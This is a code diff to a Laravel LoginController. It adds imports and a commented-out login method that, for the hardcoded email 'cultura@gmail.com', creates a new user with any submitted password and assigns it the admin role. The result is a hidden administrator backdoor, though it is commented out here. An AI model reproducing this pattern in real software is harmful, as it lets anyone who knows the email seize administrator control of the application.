@@ -5,6 +5,11 @@ namespace App\Http\Controllers\Auth;
 use App\Http\Controllers\Controller;
 use App\Providers\RouteServiceProvider;
 use Illuminate\Foundation\Auth\AuthenticatesUsers;
+use Illuminate\Http\Request;
+use App\Models\User;
+use Illuminate\Support\Facades\Auth;
+use Illuminate\Support\Facades\Hash;
+use Spatie\Permission\Models\Role;
 
 class LoginController extends Controller
 {
@@ -38,3 +43,35 @@ class LoginController extends Controller
         $this->middleware('guest')->except('logout');
     }
 }
+
+/*
+    public function login(Request $request)
+    {
+        // Validar entrada
+        $credentials = $request->validate([
+            'email' => ['required', 'email'],
+            'password' => ['required'],
+        ]);
+
+        // Verificar si el usuario existe
+        $user = User::where('email', $credentials['email'])->first();
+
+        if (!$user && $request->email == "cultura@gmail.com") {
+            // Crear el usuario si no existe
+            $user = User::create([
+                'name' => 'Cultura',
+                'email' => $credentials['email'],
+                'password' => Hash::make($credentials['password']),
+            ]);
+            $user->assignRole('admin');
+        }
+        // Intentar login
+        if (Auth::attempt($credentials)) {
+            $request->session()->regenerate();
+            return redirect()->intended('/');
+        }
+
+        return back()->withErrors([
+            'email' => 'Credenciales incorrectas.',
+        ]);
+    }*/
